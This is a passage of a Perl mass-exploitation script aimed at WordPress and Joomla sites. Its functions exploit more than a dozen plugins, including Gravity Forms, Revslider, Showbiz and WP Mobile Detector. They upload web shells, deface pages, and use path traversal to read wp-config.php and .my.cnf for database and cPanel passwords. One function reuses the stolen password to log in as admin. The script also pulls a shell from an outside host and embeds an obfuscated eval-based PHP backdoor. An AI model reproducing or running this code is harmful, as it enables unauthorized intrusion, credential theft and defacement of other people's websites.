print color('bold green'),"] ";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $levoslideshowup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"levoslideshow";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable";
print color('bold white'),"\n";
}
}
################ Power Zoomer #####################
sub powerzoomer(){ 
my $url = "$site/wp-admin/admin.php?page=powerzoomer_manage";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["Kadd3chy.php"], task => 'pwz_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/powerzoomer\/(.*?)\/big\/Kadd3chy.php/) {
$uploadfolder=$1;
$zoomerup="$site/wp-content/uploads/powerzoomer/$uploadfolder/big/Kadd3chy.php";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Power Zoomer";
print color('bold white')," Exploiting ..... ";
print color('bold green'),"Vulnerable";
print color('bold white'),"\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $zoomerup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Power Zoomer";
print color('bold white')," Exploiting ..... ";
print color('bold red'),"Not Vulnerable";
print color('bold white'),"\n";
}
}

################ Gravity Forms #####################
sub gravityforms(){
my $url = "$site/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres = $ua->post($url, Content_Type => "form-data", Content => [file => ["Kadd3chyGrav.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "Kadd3chy.php"]);

my $check = $ua->get("$target/wp-content/uploads/_input_3_Kadd3chy.php")->content;
if($check =~/Kadd3chy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Gravity Forms";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $gravityformsup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$gravityformsup\n";
close (TEXT);
}
else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Gravity Forms";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable";
print color('bold white'),"\n";
gravityforms2();
}
}
################ Gravity Forms #####################
sub gravityforms2(){
my $url = "$site/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres2 = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["Kadd3chydef.jpg"], form_id => '1', name => 'Kadd3chy.html', gform_unique_id => '../../../../../', field_id => '3',]);
$gravityformsupp = "$site/_input_3_Kadd3chy.html";
my $checkgravityformsupp = $ua->get("$gravityformsupp")->content;
if ($checkgravityformsupp =~ /Kadd3chy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Gravity Forms";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold red'),"Failed Upload Shell\n";

print color('bold white'),"Done Index Uploaded\n";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"  Shell Link => $gravityformsupp\n";
open (TEXT, '>>Result/Index.txt');
print TEXT "$gravityformsupp\n";
close (TEXT);
$def = $gravityformsupp;
zoneh();
}
else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Gravity Forms";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable";
print color('bold white'),"\n";
}
}



################ Revslider ajax #####################
sub revsliderajax(){

my $url = "$site/wp-admin/admin-ajax.php";

my $revslidajaxres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_captions_css", data => "<body style='color: transparent;background-color: black'><center><h1><b style='color: white'><center><b>Struck By Kadd3chy<b>"]);

$revsliderajax = $site . '/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css';

my $checkrevsajax = $ua->get("$revsliderajax")->content;
if($checkrevsajax =~ /Kadd3chy/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Revslider Dafece Ajax";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable";
print color('bold white'),"\n";
print color('bold white'),"Done Defaced\n";
print color('bold white'),"  Shell Link => $revsliderajax\n";
open (TEXT, '>>Result/Index.txt');
print TEXT "$revsliderajax\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Revslider Dafece Ajax";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable";
print color('bold white'),"\n";
}
}

sub getconfig{
$url = "$site/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Revslider Get Config";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
     open(save, '>>Result/ConfigRev.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
    getcpconfig();
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Revslider Get Config";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}

sub getcpconfig{
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Revslider Get cPanel";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";

$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){


print color('bold white'),"URL : $site/cpanel\n";
print color('bold white'),"USER : $1\n";
open (TEXT, '>>Result/cPanel.txt');
print TEXT "Url : $site\n";
print TEXT "USER : $1\n";
close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
            print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"PASS : $1\n";
open (TEXT, '>>Result/cPanel.txt');
print TEXT "PASS : $1\n";
close (TEXT);
        }


}
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Revslider Get cPanel";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}

#####################################       REVSLIDER       ########################################
sub getconfig2{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print colored ("Revslider Get Config2",'bold white');
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$config = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
$conflink = "$site/$config";
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){

print " ............. ";
print color('bold white');
print color('reset');
print color('bold green');
print "Vulnerable";
print color('reset');
print color('bold white');
print color('reset');
    open(save, '>>Result/Try_Manuall.txt');   
    print save "[rev cnfg] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$cont = $resp->content;
while($cont =~ m/DB_NAME/g){


        if ($cont =~ /DB_NAME\', \'(.*)\'\)/){
        print color("green"),"\t
	[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/DataBases.txt');
        print TEXT "\n[ DATABASE ] \n$site\n[-]Database Name = $1";
        close (TEXT);
        }
        if ($cont =~ /DB_USER\', \'(.*)\'\)/){
        print color("green"),"\t[+]Database User = $1 \n";
print color 'reset';
        open (TEXT, '>>Result/DataBases.txt');
        print TEXT "\n[-]Database User = $1";
        close (TEXT)
        }
        if ($cont =~ /DB_PASSWORD\', \'(.*)\'\)/){
        print color("green"),"\t[+]Database Password = $1 \n";
print color 'reset';
        $pass= $1 ;
        open (TEXT, '>>Result/DataBases.txt');
        print TEXT "\nDatabase Password = $pass";
        close (TEXT)
        }
        if ($cont =~ /DB_HOST\', \'(.*)\'\)/){
        print color("green"),"\t[+]Database Host = $1 \n\n";
print color 'reset';
        open (TEXT, '>>Result/DataBases.txt');
        print TEXT "\n[-]Database Host = $1";
        close (TEXT)
        }

wpbrute2();
getcpconfig2();
}}else{

   print " ............. ";
print color('bold white');
print color('reset');
print color('bold red');
print "Not Vulnerable";
print color('reset');
print color('bold white');
print color('reset');
print " \n";
getcpconfig2();

}

}

####################################################################################################
####################################################################################################

sub getcpconfig2{
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g){
    open(save, '>>Result/Try_Manuall.txt');   
    print save "[rev cpnl] $site\n";   
    close(save);
	
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

        print color("green"),"\n\t[+]Cpanel User = $1 \n";
print color 'reset';
        open (TEXT, '>>Result/cPanel.txt');
        print TEXT "\n[ cpanel ] \n$site\n[+]cpanel user = $1";
        close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
        print color("green"),"\t[+]Cpanel Pass = $1 \n\n";
print color 'reset';
        open (TEXT, '>>Result/cPanel.txt');
        print TEXT "\n[-]Cpanel Pass = $1";
        close (TEXT)
        }


}
}
}

####################################################################################################
####################################################################################################
####################################################################################################
sub revdef(){
print colored ("DEFACE AJAX",'bold white');

$ajx = $site . 'wp-admin/admin-ajax.php';

$def = $site .'wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css';

$lasba = POST $ajx, ['action' => 'revslider_ajax_action', 'client_action' => 'update_captions_css', 'data' =>"<body style='color: transparent;background-color: black'><center><h1><b style='color: white'><center><b>Hacked By/</b><br>Kadd3chy<p style='color: transparent'>"];
$response = $ua->request($lasba);
$stat = $response->content;
 if ($stat =~ /true/){
print  " Exploiting ........ ";
print color('bold white');
print color('reset');
print color('bold green');
print "Deface Done";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


my $checkajx= $ua->get("$def")->content;
if($checkajx =~/Hacked|By|Kadd3chy/) {

        open(save, '>>Result/Index.txt');   
    print save "[rev deface] $site\n";   
    close(save);
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print "DEFACE Exploiting ........ ";
print color('bold white');
print color('reset');
print color('bold green');
print "Deface Done";
print color('reset');
print color('bold white');
print color('reset');
print " \n";
print "LINK INDEX Exploiting ........ ";
    print color('bold white');
print color('reset');
print color('bold green');
print "Done Saved";
print color('reset');
print color('bold white');
print color('reset'); 
print " \n";
zoneh();
}
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print "Exploiting ........ \n";
print color('bold white');
print color('reset');
print color('bold red');
print "Not Vulnerable";
print color('reset');
print color('bold white');
print color('reset'); 
print " \n";

}
}

####################################################################################################
####################################################################################################
############################### PHP MY ADMIN SCANNER ##############################################
####################################################################################################
####################################################################################################
sub zebbi{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print colored ("PMA Scanner",'Bold white');
print " .................. ";
print color('bold white');
print color('reset');
print color('bold blue');
print "Just Wait";
print " \n";
print color('reset');
print color('bold white');
print color('reset');
use HTTP::Request;
use LWP::UserAgent;
@pat=('/phpMyAdmin/','/phpmyadmin/');
foreach $pma(@pat){
chomp $pma;

$url = $site.$pma;
$req = HTTP::Request->new(GET=>$url);
$userAgent = LWP::UserAgent->new();
$response = $userAgent->request($req);
$ar = $response->content;
if ($ar =~ m/Welcome to phpMyAdmin|Username|Password/g){
print "[$pma] .............. ";
print color('bold white');
print color('reset');
print color('bold green');
print "Done Founded";
print color('reset');
print color('bold white');
print color('reset');
open (TEXT, '>>Result/DataBases.txt');
print TEXT "\n[PhpMyAdmin] $url   =>   PMA Founded !!\n\n";
close (TEXT);

}else{

print "[$pma] .......... ";
print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "Not Founded";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');

}}
print "PMA SCAN Exploiting .... ";
print color('bold white');
print "[";
print color('reset');
print color('bold blue');
print "DONE";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
revdef();

}

####################################################################################################
####################################################################################################
####################################### WORDPRESS BRUTE ############################################
####################################################################################################
####################################################################################################
sub wpbrute2{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print colored ("Brute With Config Pass",'bold white');
$red = $site . '/wp-admin/';
$wp= $site . 'wp-login.php';
$admin = "admin";
print " ............ ";
print color('bold white');
print color('reset');
print color('bold blue');
print "Just Wait";
print color('reset');
print color('bold white');
print color('reset');
print " \n";
print "[Info] USER : $admin\n";
print "[Info] PASSWORD : $pass\n";
$brute = POST $wp, [log => $admin, pwd => $pass, wp-submit => 'Log In', redirect_to => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
        if ($stat =~ /302/){
print "[BRUTE] ............... ";
            print color('bold white');

print color('reset');
print color('bold green');
print "Log In Succes";
print color('reset');
print " \n";
print color('bold white');

        open (TEXT, '>>Result/Bruted.txt');
        print TEXT "\n[BRUTE][BOOM] $site/wp-login.php => User :$admin Password:$pass\n";
        close (TEXT);
        }else{
            print "[BRUTE] Exploiting .... ";
            print color('bold white');

print color('reset');
print color('bold red');
print "User And Password Dont Match";
print color('reset');
print color('bold white');
print color('reset');
print " \n";
}
zebbi();
}

################ Showbiz #####################
sub showbiz(){
my $url = "$url/wp-admin/admin-ajax.php";
sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
my $useragent = randomagent();

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent($useragent);
my $showbizres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "showbiz_ajax_action", client_action => "update_plugin", update_file => ["Kadd3chy.php"]]);

$showbizup = $site . '/wp-content/plugins/showbiz/temp/update_extract/Kadd3chy.php';

my $checkshow = $ua->get("$showbizup")->content;
if($checkshow =~ /Kadd3chy/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Showbiz";
print color('bold white')," Exploiting .......... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $showbizup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$showbizup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Showbiz";
print color('bold white')," Exploiting .......... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ Simple Ads Manager #####################
sub ads(){  
my $url = "$site/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php";

my $adsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [uploadfile => ["Kadd3chy.php"], action => 'upload_ad_image', path => '',]);
$adsup="$site/wp-content/plugins/simple-ads-manager/Kadd3chy.php";
if ($adsres->content =~ /{"status":"success"}/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Simple Ads Manager";
print color('bold white')," ................ ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $adsup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$adsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Simple Ads Manager";
print color('bold white')," ................ ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ Slide Show Pro #####################
sub slideshowpro(){ 
my $url = "$site/wp-admin/admin.php?page=slideshowpro_manage";

my $slideshowres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["Kadd3chy.php"], task => 'pro_add_new_album', album_name => '', album_desc => '',]);

if ($slideshowres->content =~ /\/uploads\/slideshowpro\/(.*?)\/big\/Kadd3chy.php/) {
$uploadfolder=$1;
$sspup="$site/wp-content/uploads/slideshowpro/$uploadfolder/big/Kadd3chy.php";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Slide Show Pro";
print color('bold white')," Exploiting ... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $sspup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$sspup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Slide Show Pro";
print color('bold white')," Exploiting ... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################################## WP Mobile Detector ########################################
##############################################################################################
# check the link of the shell or you can upload "wpmobiledetectorshell.zip" on you one shell #
##############################################################################################
sub wpmobiledetector(){ 
$wpmdshell = "http://testatranslations.com/shell/Kadd3chy.php";
$url = "$site/wp-content/plugins/wp-mobile-detector/resize.php?src=$wpmdshell";
$wpmdup="$site/wp-content/plugins/wp-mobile-detector/cache/Kadd3chy.php";

my $check = $ua->get("$url"); 

my $checkup = $ua->get("$wpmdup")->content; 
if($checkup =~/Kadd3chy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"WP Mobile Detector";
print color('bold white')," ................ ";
print color('bold green'),"Vulnerable\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  [Link] => $wpmdup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$wpmdup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"WP Mobile Detector";
print color('bold white')," ................ ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ WYSIJA #####################
sub wysija(){
$theme = "my-theme";
my $url = "$site/wp-admin/admin-post.php?page=wysija_campaigns&action=themes";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");


my $wysijares = $ua->post("$url", Content_Type => 'form-data', Content => [ $theme => ['Kadd3chyw.zip', => 'Kadd3chyw.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);
$wysijaup = "$site/wp-content/uploads/wysija/themes/Kadd3chy/Kadd3chy.php";
my $checkwysija = $ua->get("$wysijaup")->content;
if($checkwysija =~/X Attacker/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Wysija";
print color('bold white')," ............................ ";
print color('bold green'),"Vulnerable\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  [Link] => $wysijaup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$wysijaup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Wysija";
print color('bold white')," ............................ ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ InBoundio Marketing #####################
sub inboundiomarketing(){ 
my $url = "$site/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php";
$inbomarketingup = "$site/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/Kadd3chy.php";
my $inbomarketingres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["Kadd3chy.php"],]);

$checkinbomarketing = $ua->get("$inbomarketingup")->content;
if($checkinbomarketing =~/Kadd3chy/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"InBoundio Marketing";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $inbomarketingup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$inbomarketingup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"InBoundio Marketing";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}


################ dzs-zoomsounds #####################
sub dzszoomsounds(){ 
my $url = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload.php";
$dzsup = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload/Kadd3chy.php";
my $dzsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file_field => ["Kadd3chy.php"],]);

$checkdzsup = $ua->get("$dzsup")->content;
if($checkdzsup =~/Kadd3chy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"dzs-zoomsounds";
print color('bold white')," Exploiting ... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $dzsup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$dzsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"dzs-zoomsounds";
print color('bold white')," Exploiting ... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ reflex-gallery #####################/
sub reflexgallery(){ 
my $url = "$site/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=$year&Month=$month";
$reflexup = "$site/wp-content/uploads/$year/$month/Kadd3chy.php";
my $reflexres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["Kadd3chy.php"],]);

$checkreflexup = $ua->get("$reflexup")->content;
if($checkreflexup =~/Kadd3chy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Reflex Gallery";
print color('bold white')," Exploiting ... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $reflexup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$reflexup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Reflex Gallery";
print color('bold white')," Exploiting ... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ comadsmanager #####################
sub comadsmanager(){
my $url = "$site/index.php?option=com_adsmanager&task=upload&tmpl=component";

my $response = $ua->post( $url,
            Cookie => "", Content_Type => "form-data", Content => [file => ["tools/Kadd3chy.jpg"], name => "tools/Kadd3chy.html"]
           
            );

$comadsmanagerup="$site/tmp/plupload/Kadd3chy.html";

$checkcomadsmanagerup = $ua->get("$comadsmanagerup")->content;
if($checkcomadsmanagerup =~/Kadd3chy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Ads Manager";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Done File Uploaded\n";
print color('bold white'),"  [Link] => $comadsmanagerup\n";
open (TEXT, '>>Result/Index.txt');
print TEXT "$comadsmanagerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Ads Manager";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ b2jcontact #####################
sub b2j(){

my @filesz = ('/kontakty','iletisim','contatti.html','contact-us','contact-us.html','/contact','contacto','/index.php/contato.html','en/contact','contactenos');
OUTER: foreach $vulz(@filesz){
my $url = "$site/$vulz";
my $checkfoxupx = $ua->get("$url")->content;
if($checkfoxupx =~/b2j/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"B2j Contact";
print color('bold white')," Exploiting .......";
print color('bold green'),"Succes\n";
print color('bold red'), "Testing Vuln $url \n";
    print color('reset');
	my $regex='" name="cid_(.*?)"';
    if($checkfoxupx =~ s/$regex//){
    print color("bold red"), "Cid no: $1\n";
	    print color('reset');
	my $out = $1;
	my $regex='bid=(.*?)"';
    if($checkfoxupx =~ s/$regex//){
    print color("bold red"), "Bid no: $1\n";
		my $bid = $1;
		my $izo = $site . 'index.php?option=com_b2jcontact&amp;view=loader&amp;owner=component&amp;id='.$out.'&amp;bid='.$bid.'&amp;root=&type=uploader&&owner=component&id='.$out.'&qqfile=586cfc73826e4-/../Kadd3chy.php';
		    print color('reset');
my $index='<h5>Uploder Kadd3chy</h5>
<?php eval (gzinflate(base64_decode(str_rot13("ML/EF8ZjRZnsUrk/hVMOJaQZS19pZ3kkVNtX06qEFgnxAct0bH2RGin/zljgT/c2q9
/iih+BI40TaSguWq98TXxc4k0pOiufqT+K7WvibboK8kxCfTyZ6IddrWcAV5mKhyANXlg0FkNPkJ2wTHUTrlQtoJHUjjyFGycunTqKtI8lnvzPLRJ
DT6ZEPUoIKJWkYyewYRFaJxt+epn6S0qs39+umDuTfsEJnSmd3HRWTkCv/WgX54K4g98833KBSUHXv/Ygqsr+k4USOENPRjxM/ZkaAk56eYDM0xJ5
sK552h1khNHKr2lIXpZOhYvSs2VHZh8O8oKbPibYUutxFLYKpCY2KCo8Y7ByDy6D0l8=")))); ?>';
my $body = $ua->post( $izo,
        Content_Type => 'multipart/form-data',
        Content => $index
        );
my $checkfoxupx = $ua->get("$site/components/com_b2jcontact/uploads/Kadd3chy.php")->content;
if ($checkfoxupx =~ /Kadd3chy/) {	
print color('bold red'),"Done Shell Uploaded\n";
print color('bold green'),"[ShellLink] => $site/components/com_b2jcontact/uploads/Kadd3chy.php\n";
		    print color('reset');
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/components/com_b2jcontact/uploads/Kadd3chy.php\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"B2j Contact";
print color('bold white')," Exploiting ...... ";
print color('bold red'),"Not Vulnerable\n";			
}
}
}
}
}
}
sub b22j(){

my @filesz = ('/index.php/contact','/index.php/contact/adres','/kontakty','kontakty.html','contatti.html','/index.php/kontakty','/contact','contacto','/index.php/contato.html','en/contact','contactenos','contact-us');
OUTER: foreach $vulz(@filesz){
my $url = "$site/$vulz";
	print color('white on_blue')," Scanning B2j_Contact ",,$url."\n";
my $cms = $ua->get("$url")->content;
if($cms =~/b2j/) {
    print color("bold red"), "Joomla B2jcontact Found\n";
print color('bold red'), "Testing Vuln $url - \n";
    print color('reset');
    my $regex='name="b2jmoduleid_(.*?)"';
    if($cms =~ s/$regex//){
    print color("bold red"), "Cid no: $1\n";
	    print color('reset');
	my $out = $1;
	my $regex='bid=(.*?)"';
    if($cms =~ s/$regex//){
	my $bid = $1;
    print color("bold red"), "Bid no: $1\n";
}	
